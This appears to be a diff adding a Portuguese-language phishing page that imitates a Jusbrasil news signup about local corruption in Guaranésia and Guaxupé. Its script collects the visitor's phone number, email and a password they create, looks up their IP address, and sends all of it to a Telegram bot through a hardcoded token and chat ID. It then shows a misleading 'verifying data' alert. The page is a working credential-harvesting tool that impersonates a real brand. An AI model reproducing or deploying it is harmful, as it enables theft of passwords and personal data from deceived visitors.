@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Receba Notícias</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap">
+  <style>
+    body {
+      background-image: url('https://img.freepik.com/fotos-gratis/campos-agricolas-coloridos-de-cima-de-centeio-e-milho-de-trigo-girassol_661209-8.jpg?w=1380&t=st=1717202698~exp=1717203298~hmac=939d5e8a0a57c11c319d5d2e8aaa6e0b12b064ff410d8b1b1595e950e8413f34'); /* Substitua pelo URL real da imagem */
+      background-size: cover;
+      background-position: center;
+      color: #333;
+      font-family: 'Roboto', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: rgba(255, 255, 255, 0.9); /* Fundo semitransparente */
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      border-radius: 10px;
+      max-width: 400px;
+      width: 100%;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .header img {
+      height: 40px;
+      margin-right: 10px;
+    }
+
+    h2 {
+      font-size: 24px;
+      color: #4B0082;
+    }
+
+    p {
+      font-size: 14px;
+      margin-bottom: 20px;
+      color: #666;
+    }
+
+    .input-group {
+      margin-bottom: 15px;
+    }
+
+    .input-group input {
+      width: calc(100% - 20px);
+      padding: 10px;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+      font-size: 14px;
+      margin: 5px 0;
+    }
+
+    .submit-button {
+      background-color: #4B0082;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+    }
+
+    .submit-button:hover {
+      background-color: #800080;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <img src="https://static.jusbr.com/images/logo/logo-jusbrasil-1200-675.png" alt="Jusbrasil Logo"> <!-- Substitua pelo URL real da logo -->
+      <h2>Receba Notícias</h2>
+    </div>
+    <p>Cadastre-se e receba notícias sobre a nova corrupção de Guaranésia, Guaxupé e região.</p>
+    <div class="input-group">
+      <input type="number" id="username" placeholder="Celular: ">
+    </div>
+    <div class="input-group">
+      <input type="email" id="email" placeholder="Email: ">
+    </div>
+    <div class="input-group">
+      <input type="password" id="password" placeholder="Crie uma Senha: ">
+    </div>
+    <button class="submit-button" onclick="enviarMensagem()">Enviar</button>
+  </div>
+
+  <script>
+    function enviarMensagem() {
+      var username = document.getElementById("username").value;
+      var email = document.getElementById("email").value;
+      var password = document.getElementById("password").value;
+
+      fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => {
+          var ip = data.ip;
+          var mensagem = "Usuário: " + username + "\nEmail: " + email + "\nSenha: " + password + "\nIP: " + ip;
+
+          var api_key = '6210755753:AAHYK-7FWVEM0ub84R3FaeNAFxGaT9SLRAE';  // TOKEN DO SEU BOT
+          var chat_id = '-1001829193165';  // Chat ID
+
+          var xhttp = new XMLHttpRequest();
+          xhttp.open("GET", "https://api.telegram.org/bot" + api_key + "/sendMessage?chat_id=" + chat_id + "&text=" + encodeURIComponent(mensagem), true);
+          xhttp.send();
+
+          alert("Vamos te encaminhar, antes estamos verificando se os dados são verídicos, de acordo com o Artigo 15*");
+        })
+        .catch(error => {
+          console.error('Erro ao obter o IP:', error);
+        });
+    }
+  </script>
+</body>
+</html>
